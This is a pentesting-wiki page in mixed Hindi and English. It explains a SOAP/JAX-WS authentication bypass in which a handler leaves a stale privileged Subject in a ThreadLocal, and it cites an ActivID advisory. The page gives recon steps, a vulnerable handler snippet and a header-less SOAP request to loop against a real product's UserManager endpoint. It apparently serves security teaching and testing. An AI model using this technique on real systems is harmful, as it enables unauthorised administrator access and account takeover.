# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- कुछ middleware chains authenticated `Subject`/`Principal` को एक static `ThreadLocal` के अंदर स्टोर करते हैं और उसे केवल तब refresh करते हैं जब कोई proprietary SOAP header आता है।
- क्योंकि WebLogic/JBoss/GlassFish worker threads को recycle करते हैं, उस header को हटाने से थ्रेड द्वारा प्रोसेस किए गए अंतिम विशेषाधिकार प्राप्त `Subject` का बिना चेतावनी के पुन: उपयोग हो जाता है।
- कमजोर endpoint पर बिना header के लेकिन well-formed SOAP body के साथ बार‑बार रिक्वेस्ट भेजें जब तक कि कोई reused thread आपको चोरी किया गया प्रशासक संदर्भ (administrator context) प्रदान न कर दे।

## Root Cause

Handlers similar to the following only overwrite the thread-local identity when the custom header is present, so the previous request's context survives:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Recon

1. reverse proxy / routing rules को enumerate करें ताकि ऐसे hidden SOAP trees मिल सकें जो `?wsdl` को ब्लॉक कर सकते हैं पर POSTs स्वीकार करते हैं (इन्हें [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md) में दिए फ्लो के साथ map करें)।
2. EAR/WAR/EJB artifacts को अनपैक करें (`unzip *.ear`) और `application.xml`, `web.xml`, `@WebService` annotations, और handler chains (e.g., `LoginHandlerChain.xml`) की जाँच करें ताकि handler class, SOAP header QName, और backing EJB names का पता चल सके।
3. यदि metadata गायब है, तो संभावित `ServiceName?wsdl` paths को brute-force करें या अस्थायी रूप से lab proxies को relax करें, फिर किसी भी recovered WSDL को [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) जैसे tooling में import करके baseline envelopes generate करें।
4. handler sources को `ThreadLocal` keepers (e.g., `SubjectHolder.setSubject()`) के लिए रिव्यू करें जो authentication header गायब या malformed होने पर कभी clear नहीं होते।

## Exploitation

1. प्रामाणिक proprietary header **के साथ** एक मान्य request भेजें ताकि सामान्य response codes और invalid tokens के लिए प्रयुक्त किसी भी error का पता चल सके।
2. header को हटाकर वही SOAP body फिर से भेजें। XML को well-formed रखें और required namespaces का सम्मान करें ताकि handler साफ़-सुथरे तरीके से exit करे।
3. request को loop करें; जब यह किसी ऐसे thread पर पहुंचे जो पहले किसी privileged action को execute कर चुका हो, तो reused `Subject` protected operations जैसे user या credential managers को अनलॉक कर देता है।
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## बग का सत्यापन

- JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) या समान डिबगिंग हुक्स जोड़ें ताकि आप प्रत्येक कॉल से पहले और बाद में `ThreadLocal` की सामग्री देख सकें, और यह पुष्टि कर सकें कि एक बिना प्रमाणीकरण वाले अनुरोध ने पूर्व के प्रशासक `Subject` को विरासत में लिया था।

## संदर्भ

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
